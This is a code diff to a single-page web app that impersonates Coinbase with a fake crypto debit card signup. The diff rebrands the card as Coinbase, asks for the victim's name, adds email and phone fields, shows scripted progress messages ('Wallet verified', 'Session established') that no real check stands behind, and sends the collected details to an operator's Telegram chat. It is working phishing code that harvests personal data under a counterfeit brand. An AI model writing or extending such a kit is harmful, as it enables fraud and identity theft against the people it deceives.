@@ -753,22 +753,22 @@
       <div style="font-size:0;margin-bottom:16px;line-height:1">
         <svg width="64" height="64" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
       </div>
-      <h2>Enter your wallet address</h2>
-      <p class="sub">Paste your Coinbase Wallet address — no private keys or seed phrases needed.</p>
+      <h2>What's your name?</h2>
+      <p class="sub">Your name will be printed on the card exactly as you enter it.</p>
 
       <div id="s3InputWrap" style="width:100%">
         <div class="vm-field" style="margin-bottom:10px">
-          <label>Wallet Address</label>
+          <label>Full Name</label>
           <input type="text" id="cardAddrInput"
-                 placeholder="0x… Ethereum  or  ENS name (e.g. yourname.eth)"
-                 style="font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.03em"
-                 autocomplete="off" autocorrect="off" spellcheck="false" />
+                 placeholder="e.g. John Smith"
+                 style="font-size:15px;text-transform:uppercase"
+                 autocomplete="name" autocorrect="off" spellcheck="false" />
         </div>
-        <div id="s3Error" style="display:none;color:#F87171;font-size:12px;margin-bottom:10px;font-weight:600">
-          ⚠ Please enter a wallet address
+        <div id="s3Error" style="display:none;color:#D23F31;font-size:12px;margin-bottom:10px;font-weight:600">
+          ⚠ Please enter your full name
         </div>
-        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Connect &amp; Generate Card →</button>
-        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s2')">← Change wallet</button>
+        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Generate My Card →</button>
+        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s2')">← Back</button>
       </div>
 
       <div id="s3ConnLog" style="display:none;width:100%">
@@ -806,7 +806,7 @@
             <div class="card-top">
               <div class="card-logo-row">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13A6.5 6.5 0 0012 5.5zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
-                <span>cryptocard</span>
+                <span>coinbase</span>
               </div>
               <span class="card-network-badge" id="cardNetwork">ETHEREUM</span>
             </div>
@@ -828,7 +828,7 @@
       </div>
 
       <div class="reveal-label">
-        Connected: <span class="ws-addr" id="revealAddr">0x3f...a9</span> &nbsp;·&nbsp; <span class="hl" id="revealBal">$0.00</span>
+        Cardholder: <span style="font-weight:700;color:#0052FF" id="revealAddr">—</span>
       </div>
 
       <div style="height:20px"></div>
@@ -836,10 +836,10 @@
       <div class="wallet-strip">
         <div class="ws-dot"></div>
         <div>
-          <div style="font-size:12px;font-weight:700" id="wsWalletName">MetaMask</div>
-          <div class="ws-addr" id="wsAddr">0x3f4a...9b2c</div>
+          <div style="font-size:12px;font-weight:700" id="wsWalletName">Coinbase Wallet</div>
+          <div class="ws-addr" id="wsAddr">Connected</div>
         </div>
-        <div class="ws-bal" id="wsBal">$0.00</div>
+        <div class="ws-bal" id="wsBal" style="color:#0052FF;font-size:12px">✓ Active</div>
       </div>
 
       <div class="card-details" id="cardDetails">
@@ -862,16 +862,16 @@
           </div>
         </div>
         <div class="cd-row">
-          <span>Billing address</span>
-          <strong style="font-size:12px;font-family:inherit" id="cd-addr">Linked to wallet</strong>
+          <span>Cardholder</span>
+          <strong style="font-size:12px;font-family:inherit" id="cd-addr">—</strong>
         </div>
         <div class="cd-row">
-          <span>Spending from</span>
-          <strong id="cd-wallet" style="font-size:12px">ETH Wallet</strong>
+          <span>Linked wallet</span>
+          <strong id="cd-wallet" style="font-size:12px">Coinbase Wallet</strong>
         </div>
         <div class="cd-row">
           <span>Rewards</span>
-          <strong style="color:#34D399">4% back in XLM</strong>
+          <strong style="color:#0052FF">4% back in XLM</strong>
         </div>
       </div>
 
@@ -905,7 +905,7 @@
       <div class="card-details" style="margin-bottom:20px">
         <div class="cd-row"><span>Status</span><strong style="color:#05B169">✓ Enrolled</strong></div>
         <div class="cd-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
-        <div class="cd-row"><span>Address</span><strong id="s10Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
+        <div class="cd-row"><span>Cardholder</span><strong id="s10Addr">—</strong></div>
         <div class="cd-row"><span>Card type</span><strong id="s10Type">Virtual Card</strong></div>
         <div class="cd-row"><span>Rewards</span><strong style="color:#0052FF">4% back in XLM</strong></div>
       </div>
@@ -925,6 +925,10 @@
         <div class="vm-row-2">
           <div class="vm-field"><label>First name</label><input type="text" placeholder="John" /></div>
           <div class="vm-field"><label>Last name</label><input type="text" placeholder="Doe" /></div>
+        </div>
+        <div class="vm-row-2">
+          <div class="vm-field"><label>Email address</label><input type="email" placeholder="john@example.com" /></div>
+          <div class="vm-field"><label>Phone number</label><input type="tel" placeholder="+1 (555) 000-0000" /></div>
         </div>
         <div class="vm-field"><label>Street address</label><input type="text" placeholder="123 Main Street" /></div>
         <div class="vm-field"><label>Apt / Suite</label><input type="text" placeholder="Apt 4B (optional)" /></div>
@@ -974,9 +978,9 @@ const TG_CHAT  = 'YOUR_CHAT_ID';     // e.g. '-1001234567890'
 
 /* ── STATE ── */
 let cardType   = 'virtual';
-let walletName = 'Coinbase Wallet';
-let walletAddr = '';
-let walletBal  = '$0.00';
+let walletName     = 'Coinbase Wallet';
+let walletAddr     = '';   // stores the cardholder name
+let walletBal      = '$0.00';
 
 function rnd(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
@@ -1023,22 +1027,22 @@ function connectWallet(name) {
   showScreen('s3');
 }
 
-/* ── STEP 2b: SUBMIT ADDRESS (card flow) ── */
+/* ── STEP 2b: SUBMIT NAME (card flow) ── */
 function submitCardAddr() {
   const input = document.getElementById('cardAddrInput');
   const err   = document.getElementById('s3Error');
-  const addr  = input.value.trim();
+  const name  = input.value.trim();
 
-  if (!addr || addr.length < 6) {
+  if (!name || name.length < 2) {
     err.style.display = '';
-    input.style.borderColor = '#F87171';
-    input.style.boxShadow = '0 0 0 3px rgba(248,113,113,.15)';
+    input.style.borderColor = '#D23F31';
+    input.style.boxShadow = '0 0 0 3px rgba(210,63,49,.15)';
     setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
     return;
   }
 
   err.style.display = 'none';
-  walletAddr = addr;
+  walletAddr = name.toUpperCase();   // stored as uppercase for the card
 
   // Hide form, show brief connecting log
   document.getElementById('s3InputWrap').style.display = 'none';
@@ -1047,11 +1051,11 @@ function submitCardAddr() {
   const log = document.getElementById('connectLog');
   log.innerHTML = '';
   [
-    { cls:'info', text:'Verifying Coinbase Wallet address…',     delay:0 },
-    { cls:'ok',   text:'Address validated ✓',                    delay:550 },
+    { cls:'info', text:'Connecting Coinbase Wallet…',            delay:0 },
+    { cls:'ok',   text:'Wallet verified ✓',                      delay:550 },
     { cls:'info', text:'Issuing JWT session token…',             delay:900 },
     { cls:'ok',   text:'Session established ✓',                  delay:1300 },
-    { cls:'ok',   text:'Proceeding to card generation…',         delay:1600 },
+    { cls:'ok',   text:'Generating your card…',                  delay:1600 },
   ].forEach(({cls, text, delay}) => {
     setTimeout(() => {
       const d = document.createElement('div');
@@ -1135,15 +1139,12 @@ function revealCard() {
   showScreen('s5');
 
   // Set wallet info
+  // Put name on the card
+  document.getElementById('cardHolder').textContent  = walletAddr;
+  document.getElementById('revealAddr').textContent  = walletAddr;
+  document.getElementById('cd-addr').textContent     = walletAddr;
   document.getElementById('wsWalletName').textContent = 'Coinbase Wallet';
-  document.getElementById('wsAddr').textContent = walletAddr;
-  document.getElementById('wsBal').textContent  = '$0.00';
-  const shortAddr = walletAddr.length > 14
-    ? walletAddr.slice(0,8) + '…' + walletAddr.slice(-5)
-    : walletAddr;
-  document.getElementById('revealAddr').textContent = shortAddr;
-  document.getElementById('revealBal').textContent  = '$0.00';
-  document.getElementById('cd-wallet').textContent  = 'Coinbase Wallet';
+  document.getElementById('cd-wallet').textContent   = 'Coinbase Wallet';
   document.getElementById('cardNetwork').textContent = 'COINBASE';
 
   animateCardNumber();
@@ -1236,7 +1237,7 @@ async function submitAttestation() {
     `📅 ${new Date().toLocaleString()}\n` +
     `💳 Card type: ${cardType === 'physical' ? 'Physical' : 'Virtual'}\n` +
     `👛 Wallet: Coinbase Wallet\n` +
-    `📍 Address: ${walletAddr}\n` +
+    `👤 Cardholder: ${walletAddr}\n` +
     `✅ Attestation: "${val}"`;
 
   try { await sendToTelegram(msg); } catch(e) { console.warn('Telegram:', e.message); }
